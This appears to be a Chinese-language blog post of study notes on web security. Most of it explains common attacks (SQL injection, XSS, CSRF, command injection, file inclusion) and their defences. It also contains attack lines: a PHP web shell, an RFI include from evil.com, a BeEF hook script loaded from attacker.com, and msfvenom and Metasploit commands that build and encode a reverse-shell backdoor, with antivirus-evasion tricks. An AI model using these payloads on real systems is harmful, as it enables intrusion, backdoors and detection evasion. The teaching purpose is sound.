---
title: "Web Security"
date: 2024-06-28T00:00:17+08:00
draft: false
description: "常見的 Web attack 和防禦方法"
type: "post"
tags: ["security"]
categories : ["security"]
---

## SQL Injection
- 描述：攻擊者透過將惡意 SQL 語句插入輸入欄位，使後端資料庫執行未預期的查詢。

- 常見錯誤做法：
  - 將用戶輸入直接拼接至 SQL 查詢字串。
  - 忽略了登入、搜尋等功能的輸入驗證。

- 防禦方法：
  - 使用 預備語句（Prepared Statements）
    - 資料庫不會把參數當作 SQL 語句的一部分，而是編譯完後再套用
  - 使用 ORM（如 SQLAlchemy、Django ORM）

## XSS (Cross Site Scripting)
- 允許攻擊者在網頁上執行 javascript code
- 執行在 client 端，不是 server 端
### 常見類型

#### Reflected XSS（反射型）
- 利用 URL 傳參（如搜尋結果）注入 script。
- 攻擊碼未儲存在伺服器，每次點擊連結才會觸發。
- 攻擊範例：
  ```
  https://example.com/search?q=<script>alert(1)</script>
  ```

#### Stored XSS（儲存型）
- 惡意腳本被儲存在伺服器（如留言板、文章內容）。
- 所有瀏覽該頁的使用者都會中招。
- ❗ 通常危害最大。

#### DOM-based XSS
- 發生在 JavaScript 對 DOM 操作時，未妥善處理使用者輸入。
- 典型漏洞：
  ```
  document.body.innerHTML = location.search;
  ```
    - 
### 防禦方法

#### 輸出時進行 HTML Encoding（最基本防禦）
- 將特殊字元轉為安全實體：
  - `<` → `&lt;`
  - `"` → `&quot;` …等
- **只要資料要顯示到網頁，就要 encode！**
#### 避免動態寫入 innerHTML、document.write 等 API
- 優先使用 `textContent` 或 `setAttribute` 等安全替代。
#### 使用框架的自動防護機制
- React、Angular、Vue 等現代框架預設對插入內容進行 escape。
#### Content Security Policy（CSP）
- CSP 是一種瀏覽器安全機制，用來限制網頁能夠載入哪些資源，減少 XSS 和資料竄改的風險。
- 透過設定 HTTP Header（`Content-Security-Policy`）來告訴瀏覽器允許執行或載入的資源來源。
### CSP 主要防護功能

- **禁止內嵌 Javascript**
  - 比如 inline scripts、inline event handlers（如 `onclick`、`onload` 等）。  
  - 內嵌腳本指的是直接寫在 HTML 頁面中的 `<script>` 標籤內的 JavaScript，或以 `onclick`、`onload` 等 HTML 屬性方式寫的腳本。這類腳本容易被注入惡意程式碼。CSP 可以禁止這種執行，強制所有腳本必須來自外部可信來源。
- **禁止不安全 API**
  - 比如 `eval()` 及類似的 API。  
  - 這些 API 可以執行任意 JavaScript 代碼，容易被攻擊者利用來執行惡意腳本。CSP 可以禁止這些不安全的 API，減少 XSS 攻擊的風險。
- **限制外部資源來源**  
包括限制載入 JavaScript、CSS、圖片、字型等的來源網址，避免來自未知或惡意網站的資源執行。
- **防止點擊劫持（Clickjacking）**  
限制哪些網站可以將此頁面放入 `<iframe>`。

##### CSP Header 範例
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.example.com; style-src 'self' 'unsafe-inline'; img-src *; font-src https://fonts.gstatic.com; connect-src 'none'; frame-ancestors 'none'; base-uri 'self';
```

##### 主要 Directive 解釋
- `default-src`: 預設允許載入的資源來源（當其他 directive 未明確定義時）
- `script-src`: 允許載入執行的 JavaScript 來源
- `style-src`: 允許載入 CSS 來源
- `img-src`: 允許載入圖片來源
- `font-src`: 允許載入字型來源
- `connect-src`: 限制 AJAX / WebSocket 連線來源
- `frame-ancestors`: 限制該頁面可以被嵌入的父框架來源（防止 Clickjacking）
- `base-uri`: 限制 `<base>` 標籤的 href 設定來源
- `upgrade-insecure-requests`: 在一些情況下自動將 HTTP 資源升級為 HTTPS

##### 常用關鍵字
- `'self'`: 只允許同源資源
- `'none'`: 不允許任何來源
- `'unsafe-inline'`: 允許內嵌腳本或樣式（一般不建議）
- `'strict-dynamic'`: 允許動態載入腳本，搭配 nonce 使用
  - 用在第三方腳本，只需要允許第三方腳本有 hash 或 nonce，就信任他們，讓他們自己可以載入其他更多腳本或是用 inline script
- `https:`: 允許 HTTPS 協定的資源

##### 使用 Nonce 或 Hash 允許特定內嵌腳本
Nonce（Number used once，一次性隨機數）是伺服器每次回應時隨機產生的一組字串（類似密碼），並把它放到 CSP 標頭裡和內嵌 `<script>` 標籤的 `nonce` 屬性中。
如果攻擊者無法預測這個 nonce，就無法注入惡意腳本。
- Nonce 範例：
```http
Content-Security-Policy: script-src 'nonce-2726c7f26c' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

- HTML 內嵌腳本需帶相同 nonce：
```html
<script nonce="2726c7f26c">
  // 安全允許執行的腳本
</script>
```

##### Str

##### 注意事項
- CSP 設定太寬鬆（如允許 `'unsafe-inline'`）會降低防護效果
- 初次部署可用瀏覽器報告模式（`Content-Security-Policy-Report-Only`）測試設定是否有阻擋合法資源
- 配合其他安全機制（如 HTTP Only Cookies、SameSite Cookie）能更完善防護



## CSRF（Cross Site Request Forgery，跨站請求偽造）

**描述**：攻擊者引導使用者瀏覽惡意網站，並在使用者已登入的情況下，自動對原本網站發送請求，造成非預期操作（如轉帳、刪除帳號）。

**發生條件**：
- 使用者已登入（例如 cookie 中有有效 session）。
- 伺服器驗證只依賴 cookie，而沒有進一步驗證請求來源或內容真偽。

---

### 防禦方法

#### Anti-CSRF Token（主流方法）
- 每次產生表單時，伺服器也產生一個 **不可預測、短期有效** 的 token。
- token 需與該使用者 session 綁定，並存於伺服器端（或 JWT claim）。
- 前端送出 request 時，要同時提交這個 token（通常放在隱藏欄位或 header）。
- 伺服器驗證 token 是否正確、是否過期、是否與 session 符合。

```html
<!-- HTML 表單中加入隱藏欄位 -->
<input type="hidden" name="csrf_token" value="a1b2c3d4...">
```

#### SameSite Cookie 屬性（瀏覽器輔助防禦）
- 在設定 session cookie 時加上 `SameSite=Strict` 或 `SameSite=Lax`：
  
```http
Set-Cookie: sessionid=abc123; SameSite=Strict; HttpOnly; Secure
```

- 可防止瀏覽器在「跨站情境」中夾帶 cookie，自然也阻擋了 CSRF 攻擊。
- 但是有可能發生某個 A 子網域有 XSS 漏洞，然後發給 B 子網域的情況

#### 檢查 Referer / Origin Header（次要輔助）
- 驗證 `Origin` 或 `Referer` 是否來自預期的網域，但會有兼容性或隱私問題。

## Command Injection (命令注入)
**描述**：攻擊者將惡意系統命令注入後端指令執行語句中。

**常見場景**：檔案壓縮、ping 指令、備份指令等功能。

**防禦方法**：
- 使用函式庫提供的安全方法（如 `subprocess.run()` 而非 `os.system()`）
  - 避免字串拼接
- 僅接受白名單參數
  - 完整驗證與過濾使用者輸入

## File Upload Vulnerability
**描述**：攻擊者上傳惡意檔案（如 Web shell）並遠端執行。
例如：上傳一個叫 shell.php 的檔案，裡面包含 <?php system($_GET['cmd']); ?>，攻擊者即可用網址執行任何系統指令：
```bash
http://example.com/uploads/shell.php?cmd=whoami
```

**防禦方法**：
- 限制上傳檔案類型與大小
- 不要允許使用者上傳任何可執行的檔案
- 隨機重新命名上傳檔案並儲存在不可執行目錄（ex: /var/uploads 而不是 /var/www/html/uploads）

## Clickjacking
**描述**：攻擊者利用 iframe 誘使使用者點擊被覆蓋的元素（如「刪除帳號」）。

**防禦方法**：
- 使用 `X-Frame-Options: DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。
  - 避免 iframe 嵌入網站
- 在 UI 中增加視覺提示避免誤點
  - 比如二次確認

## Session Fixation / Session Hijacking
**描述**：
- Fixation：攻擊者先取得一個合法的 Session ID，讓給使用者，就能用相同 ID 竊取身分。
- Hijacking：攻擊者竊取受害者的 Session ID。

**防禦方法**：
- 登入成功後 **重新產生 Session ID**
- 禁止客戶端設定 Session ID
- 使用者長時間不操作即強制登出（Session timeout）
- 多裝置登入監控、異常地點登入提示


## OS Command Injection
**描述**：攻擊者將惡意的系統指令插入到伺服器執行的命令中，可能導致系統被入侵、資料外洩，嚴重時可導致遠端程式碼執行（RCE）。

**常見場景**：
- 系統提供 ping、zip、tar 等功能，將用戶輸入直接拼接進 shell 命令。
- 使用 `os.system()`、`exec()`、`eval()` 等高風險函式處理輸入。

**防禦方法**：
- **避免使用高風險函式**：使用更安全的替代方法，如 Python 的 `subprocess.run()` 並以 list 方式傳入參數。
- **使用正規表達式過濾輸入**：
  - 例如只允許英數字：`^[a-zA-Z0-9]+$`
- **執行環境隔離**：使用容器（如 Docker）隔離潛在受害服務。

## File Inclusion Vulnerabilities
攻擊者利用應用程式動態載入檔案的特性，來讀取、執行不該被存取的檔案，導致敏感資訊外洩甚至遠端程式碼執行（RCE）。
### LFI（Local File Inclusion，本地檔案引入）
**描述**：攻擊者可透過修改 URL 或參數，使伺服器載入本地的任意檔案，例如 `/etc/passwd`、Apache 設定檔、PHP session 資料等。

**常見利用方式**：
- 包含類似 `include($_GET['page'])` 的程式碼。
- 搭配 `../../../../../etc/passwd` 進行目錄穿越（Directory Traversal）。

### RFI（Remote File Inclusion，遠端檔案引入）
**描述**：攻擊者可引入並執行來自遠端的程式碼（如 PHP 檔），達成遠端程式碼執行（RCE）。

**常見利用方式**：
- `include($_GET['url'])` 載入 `http://evil.com/shell.txt`，而檔案內容實際為 PHP 程式碼。

### 防禦方法
- **嚴格限制可引入的檔案來源與名稱**（使用白名單設計）：
  ```php
  $allowed = ['about', 'contact'];
  if (in_array($_GET['page'], $allowed)) {
      include("pages/" . $_GET['page'] . ".php");
  }
  ```
- 避免使用變數作為檔案名稱來源，改為靜態包含（static include）。
- 關閉 PHP 設定中的遠端引入功能
- 避免動態組合檔名，並過濾輸入：
  - 防止目錄穿越：移除 ../ 或使用 realpath() 比對路徑範圍。
  - 防止 null byte 攻擊（舊版本 PHP 用 %00 終止字串）。
- 伺服器權限管理：
  - 避免將敏感檔案與應用程式放在同一目錄。
  - 執行帳號應無法讀寫非必要檔案。



## Backdoor 建立工具
### msfvenom
**是什麼？**  
Metasploit Framework 所提供的 payload 產生工具，可以產出能在目標系統執行的**惡意程式碼**（後門）。

**用途：**
- 建立可執行的 Payload，如：
  - Windows：`.exe`
  - Linux：`.elf`
  - Android：`.apk`
- 支援多種**連線方式**（payload type）：
  - `reverse_tcp`：目標端主動連回攻擊者
  - `bind_tcp`：目標端開一個 port 等攻擊者連線
- 可加上 Encoder 混淆內容，避開簡單的防毒檢查
**簡單範例：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```
產出一個 Windows 的反向連線後門程式 `backdoor.exe`，當執行後會主動回連給攻擊者。

### msfconsole
**是什麼？**  
Metasploit 的主控制台，提供 CLI 介面來使用各種攻擊模組。

**用途：**
- 設定 **Listener**（聆聽端），等待後門回連（如上例的 reverse_tcp）
- 使用 `exploit` 模組發送攻擊
- 建立與受害主機的互動式 session（如 `meterpreter`）

**簡單使用流程：**
1. 啟動控制台：
   ```bash
   msfconsole
   ```
2. 載入 handler 模組（接收反向連線）：
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.100
   set LPORT 4444
   run
   ```
3. 等待 `backdoor.exe` 被目標執行 → 自動建立 session

### Anti-Virus Evasion（規避防毒軟體）
**目的**：讓惡意程式（如後門）**避開防毒軟體偵測**，成功在受害者系統上執行。  
現代防毒使用靜態與動態分析來識別惡意程式，因此攻擊者會針對這兩類技術進行規避。

#### 原理
##### Static Analysis（靜態分析）
**分析方式**：
- 防毒會掃描**檔案的內容**，比對是否與已知病毒碼（signature）或結構特徵相符。
- 不需執行程式，只從檔案本身判斷。

**規避手法**：

| 技術 | 說明 |
|------|------|
| Packers | 使用壓縮/加殼工具（如 UPX）將程式包裹起來，改變 payload 的 signature |
| Encoders | 編碼 payload，例如用 XOR、base64 等變形 |
| Obfuscators | 程式碼混淆，加入亂數變數名稱、無用指令或是做其他等效轉換等等 |
| Binary Padding | 人為插入 junk bytes，讓 hash 改變、外觀與特徵不同，或是靠過大的檔案突破檢測限制 |

**範例（使用 msfvenom 加 encoders）：**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > evaded.exe
```
- `-e`：指定 encoder
- `-i 5`：多次重複編碼（提高變異性）

##### Dynamic / Heuristic Analysis（動態 / 啟發式分析）

**分析方式**：
- 在安全環境（sandbox）執行程式，觀察其行為（如改 registry、建立連線、修改檔案等）。
- 若行為類似惡意軟體，即使內容不相同，也會被標示為威脅。

**規避手法**：

| 技術 | 說明 |
|------|------|
| 延遲執行 | 程式先 sleep 30 秒後才觸發惡意行為，躲過短時間沙盒分析 |
| 引導正常行為 | 先開啟記事本、瀏覽器等合法操作掩蓋真正目的 |
| 沙盒檢測 | 判斷系統是否為虛擬機／分析環境（例如偵測硬碟名稱、MAC、RAM 小於某值）來決定是否執行 |

## Exploitation Framework：BeEF（Browser Exploitation Framework）

### BeEF 是什麼？
BeEF 是一套專門用來**攻擊瀏覽器**的滲透測試框架，名字來自 **Browser Exploitation Framework**。  
它讓你可以透過 XSS 等漏洞，將受害者的瀏覽器「hook」進你的控制中心，並執行各種針對性的操作。

---

### 攻擊流程簡介

1. **注入 hook.js**：
   - 攻擊者設法讓目標載入 BeEF 的 JavaScript hook（通常透過 XSS）。
   - 範例注入碼：
     ```html
     <script src="http://attacker.com/hook.js"></script>
     ```

2. **瀏覽器被 hook 後**：
   - 會定期向 BeEF 控制中心送出心跳請求，成為一個 hooked client。
   - 攻擊者就能透過介面操作該瀏覽器。
